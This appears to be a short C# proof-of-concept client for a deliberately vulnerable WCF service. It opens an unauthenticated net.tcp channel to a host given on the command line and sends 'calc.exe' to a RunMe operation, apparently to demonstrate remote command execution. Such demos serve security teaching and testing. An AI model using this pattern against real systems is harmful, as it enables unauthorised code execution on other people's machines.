using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.ServiceModel;
using System.Text;

namespace VulnServiceClient {

    [ServiceContract]
    public interface IVulnService {

        [OperationContract]
        void RunMe(string str);
    }

    public class VulnServiceClient : IVulnService {


        public static void Main(string[] args) {
            string host;
            if (args.Length == 0) host = "localhost";
            else host = args[0];
            ChannelFactory<IVulnService> channelFactory = new ChannelFactory<IVulnService>(
            new NetTcpBinding(SecurityMode.None),
            string.Format("net.tcp://{0}:81/VulnService/RunMe", host));
            IVulnService client = channelFactory.CreateChannel();
            client.RunMe("calc.exe");
        }

        public void RunMe(string str) {
            throw new NotImplementedException();
        }
    }
}